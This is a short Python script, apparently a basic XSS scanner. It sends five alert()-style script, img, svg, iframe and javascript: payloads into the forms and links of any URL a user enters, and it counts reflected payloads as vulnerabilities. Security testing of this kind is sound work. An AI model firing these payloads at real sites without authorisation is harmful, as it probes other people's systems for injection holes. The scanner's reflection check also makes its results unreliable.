#XSS Scanner and payload generator py3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Function to generate XSS payloads
def generate_xss_payloads():
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<svg onload='alert(\"XSS\")'></svg>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<a href='javascript:alert(\"XSS\")'>Click me</a>"
    ]
    return payloads

# Function to scan a website for XSS vulnerabilities
def scan_for_xss(url):
    # Send a GET request to the target URL
    response = requests.get(url)
    
    # Parse the HTML content
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find all input fields and URLs
    inputs = soup.find_all(['input', 'textarea', 'a'], {'type': True, 'name': True, 'id': True})
    urls = soup.find_all('a', href=True)
    
    # Combine input fields and URLs
    elements = inputs + urls
    
    # Test each element for XSS vulnerabilities
    for element in elements:
        # Check if the element is vulnerable to XSS
        for payload in generate_xss_payloads():
            # Create a modified URL or input value with the XSS payload
            if element.name == 'a':
                test_url = urljoin(url, element['href'] + payload)
                response = requests.get(test_url)
            else:
                test_data = {element['name']: payload}
                response = requests.post(url, data=test_data)
                
            # Check if the XSS payload was executed
            if payload in response.text:
                print(f"XSS vulnerability found in element: {element}")
                break

def main():
    # URL of the target website
    target_url = input("Enter the URL of the website to scan: ")
    
    # Scan the target website for XSS vulnerabilities
    scan_for_xss(target_url)

if __name__ == "__main__":
    main()



# generate_xss_payloads: Generates a list of common XSS payloads.
# scan_for_xss: Scans a target website for XSS vulnerabilities by testing input fields and URLs with XSS payloads.
